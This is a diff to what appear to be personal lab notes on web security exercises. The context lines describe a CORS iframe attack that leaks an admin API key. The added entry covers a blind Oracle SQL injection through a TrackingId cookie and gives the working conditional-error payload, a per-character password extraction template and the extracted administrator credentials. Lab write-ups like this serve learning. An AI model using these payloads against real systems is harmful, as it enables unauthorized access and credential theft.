@@ -265,3 +265,12 @@ websocket, dom-xss, cache-poisoning, clickjacking
     - /accountDetails returns admin API key with credentials
     - Exploit: srcdoc iframe + XMLHttpRequest with withCredentials=true
     - Admin API key: pGaVOclyKuQeEY6CTr7zYGrse6NnsE3G
+
+### SQLi (16)
+58. Blind SQL injection with conditional errors (Oracle)
+    - TrackingId cookie injectable, Oracle DB
+    - Error trigger: ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+    - Extract: SUBSTR(password,{i},1) = '{c}' with TO_CHAR(1/0) for true condition
+    - Must use FROM dual for standalone SELECT in Oracle
+    - Extracted: administrator / zfc6opka8uiwb7fnp2ll
+    - ~20 requests/second extraction speed
